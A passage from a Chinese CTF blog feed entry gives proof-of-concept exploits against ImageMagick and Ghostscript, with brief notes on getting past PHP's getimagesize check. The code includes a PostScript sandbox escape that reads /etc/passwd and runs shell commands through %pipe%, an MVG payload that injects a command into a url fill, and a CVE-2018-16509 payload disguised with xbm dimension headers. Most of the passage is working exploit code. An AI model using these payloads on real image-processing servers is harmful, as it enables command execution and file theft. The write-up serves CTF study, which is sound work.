class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">        % cause a &#x2F;typecheck error we handle above</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">% Demonstrate reading a file we shouldnt have access to.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">% run command</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">(All done.)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">quit</span></pre></td></tr></table></figure></li></ul><ul><li><h2 id="绕过getimagesize，执行new-ImageMagick-漏洞"><a href="#绕过getimagesize，执行new-ImageMagick-漏洞" class="headerlink" title="绕过getimagesize，执行new ImageMagick()漏洞"></a>绕过getimagesize，执行new ImageMagick()漏洞</h2><ul><li><h3 id="mvg格式的POC-："><a href="#mvg格式的POC-：" class="headerlink" title="mvg格式的POC ："></a>mvg格式的POC ：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|&quot;&#96;id&#96;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">#define xlogo_width 200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">#define xlogo_height 200</span></pre></td></tr></table></figure><ul><li><p>xbm图片是一个文本格式的文件，而不像其他图片一样是二进制文件。如果某一行格式满足</p><p><code>#define %s %d</code>，那么取出其中的字符串和数字，再从字符串中取出<code>width</code>或<code>height</code>，将数字作为图片的长和宽。</p></li><li><p>后面两句，使其正常判断mvg格式文件的大小</p></li></ul></li><li><h4 id="ps文件poc"><a href="#ps文件poc" class="headerlink" title="ps文件poc"></a>ps文件poc</h4><ul><li><p>借助CVE-2018-16509的POC </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">__________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#x2F;test &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_width 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_height 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      在ctf的图片操作中，利用此模块代码的漏洞进行绕过。
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="绕过" scheme="http://h3art3ars.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
</feed>
